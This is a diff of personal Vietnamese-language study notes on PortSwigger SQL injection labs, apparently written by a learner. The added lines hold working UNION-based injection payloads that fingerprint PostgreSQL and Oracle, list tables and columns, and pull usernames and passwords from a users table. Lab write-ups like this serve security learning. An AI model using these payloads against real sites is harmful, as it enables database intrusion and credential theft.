@@ -43,7 +43,7 @@ Substring
 
 Comments
 You can use comments to truncate a query and remove the portion of the original query that follows your input.
-    Oracle	    --comment
+    Oracle	    --comment ( cay vl rõ ràng chatgpt hỏi thì oracle không dùng comment -- như này, mà theo logic của bài 5 thì cũng đúng)
     Microsoft	--comment
                 /*comment*/
     PostgreSQL	--comment
@@ -186,4 +186,24 @@ Bài 5 : https://portswigger.net/web-security/sql-injection/examining-the-databa
     Bài này gợi ý là UNION attack
         -> Ta đã học đc 2 bài UNION khác nhau -> thử payload 
             '+UNION+SELECT+'abc','def'--
-                -> Đây là oracle -> lấy các câu truy vấn liên quan oracle 
+                -> Chưa kết luận được đây là gì nhưng không phải là oracle
+            'UNION+SELECT+version(),+NULL--
+                -> payload này sử dụng được -> là PortgreSQL
+            'UNION+SELECT+table_name,NULL+FROM information_schema.tables--
+                Cái cần nhớ ở đây là table_name và information_schema.tables-- của loại database PortgreSQL
+                => Hiện thị danh sách table_name
+            'UNION+SELECT+column_name,NULL+FROM information_schema.columns WHERE table_name = 'users_hcwsjv'--
+                Cái cần nhớ ở đây là column_name , information_schema.columns
+                Đã trả về số lượng cột, hàng của database 
+            'UNION+SELECT+username_zlowfo,password_oaiwqn+FROM+users_hcwsjv--
+                2 Giá trị username_zlowfo và password_oaiwqn là tên cột của bảng 
+
+Bài 6 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+    'UNION+SELECT+NULL,NULL+FROM+DUAL--
+        Đừng để phải giải thích nhiều đang nóng tính 
+        -> Loại trừ PortgreSQL 
+    'UNION+SELECT+table_name,NULL+FROM+all_tables--
+        Không nghi ngờ gì nữa Oracle rồi 
+        Đáng nhớ ở đây là table_name và all_tables
+    
+    
